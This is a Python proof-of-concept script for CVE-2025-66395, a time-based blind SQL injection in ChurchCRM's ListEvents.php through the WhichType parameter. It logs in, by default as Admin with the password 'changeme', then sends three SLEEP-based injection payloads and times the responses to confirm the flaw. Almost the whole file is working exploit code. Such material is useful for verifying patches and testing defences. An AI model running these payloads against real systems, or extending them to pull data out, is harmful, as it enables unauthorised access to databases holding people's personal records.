#!/usr/bin/env python3
import requests
import time
import sys
import argparse

def get_session(base_url, username, password):
    session = requests.Session()
    login_url = f"{base_url}/session/begin"
    
    data = {
        "User": username,
        "Password": password
    }
    
    resp = session.post(login_url, data=data, allow_redirects=True)
    
    if "Logout" in resp.text or "session/end" in resp.text.lower():
        return session
    
    login_url = f"{base_url}/Login.php"
    resp = session.post(login_url, data=data, allow_redirects=True)
    
    if "Logout" in resp.text or "Menu" in resp.text:
        return session
    
    return None

def test_sqli(base_url, session):
    url = f"{base_url}/ListEvents.php"
    
    print("[*] Testing SQL injection in WhichType parameter...")
    
    baseline_payload = {"WhichType": "1"}
    start = time.time()
    resp = session.post(url, data=baseline_payload)
    baseline_time = time.time() - start
    print(f"[*] Baseline response time: {baseline_time:.2f}s")
    
    sleep_seconds = 5
    sqli_payload = {"WhichType": f"1' AND SLEEP({sleep_seconds})-- -"}
    
    print(f"[*] Testing time-based blind SQLi with {sleep_seconds}s delay...")
    start = time.time()
    resp = session.post(url, data=sqli_payload)
    sqli_time = time.time() - start
    print(f"[*] SQLi response time: {sqli_time:.2f}s")
    
    if sqli_time >= sleep_seconds:
        print(f"[+] VULNERABLE! Response delayed by {sqli_time:.2f}s (expected >= {sleep_seconds}s)")
        return True, sqli_time
    
    sqli_payload2 = {"WhichType": f"1 AND SLEEP({sleep_seconds})"}
    print(f"[*] Testing alternative payload...")
    start = time.time()
    resp = session.post(url, data=sqli_payload2)
    sqli_time2 = time.time() - start
    print(f"[*] Alternative SQLi response time: {sqli_time2:.2f}s")
    
    if sqli_time2 >= sleep_seconds:
        print(f"[+] VULNERABLE! Response delayed by {sqli_time2:.2f}s (expected >= {sleep_seconds}s)")
        return True, sqli_time2
    
    sqli_payload3 = {"WhichType": f"1' OR SLEEP({sleep_seconds})#"}
    print(f"[*] Testing third payload variant...")
    start = time.time()
    resp = session.post(url, data=sqli_payload3)
    sqli_time3 = time.time() - start
    print(f"[*] Third variant response time: {sqli_time3:.2f}s")
    
    if sqli_time3 >= sleep_seconds:
        print(f"[+] VULNERABLE! Response delayed by {sqli_time3:.2f}s (expected >= {sleep_seconds}s)")
        return True, sqli_time3
    
    print("[-] Not vulnerable or payload needs adjustment")
    return False, max(sqli_time, sqli_time2, sqli_time3)

def main():
    parser = argparse.ArgumentParser(description="CVE-2025-66395 ChurchCRM SQL Injection PoC")
    parser.add_argument("--url", default="http://localhost:8086", help="Target URL")
    parser.add_argument("--username", default="Admin", help="Username")
    parser.add_argument("--password", default="changeme", help="Password")
    args = parser.parse_args()
    
    base_url = args.url.rstrip("/")
    
    print(f"[*] Target: {base_url}")
    print(f"[*] Attempting login as {args.username}...")
    
    session = get_session(base_url, args.username, args.password)
    
    if not session:
        print("[-] Failed to authenticate")
        return 1
    
    print("[+] Authentication successful")
    
    vulnerable, response_time = test_sqli(base_url, session)
    
    if vulnerable:
        print("\n[+] CVE-2025-66395 SQL Injection vulnerability confirmed!")
        print("[+] The WhichType parameter in ListEvents.php is vulnerable to time-based blind SQL injection.")
        return 0
    else:
        print("\n[-] Could not confirm vulnerability")
        return 1

if __name__ == "__main__":
    sys.exit(main())
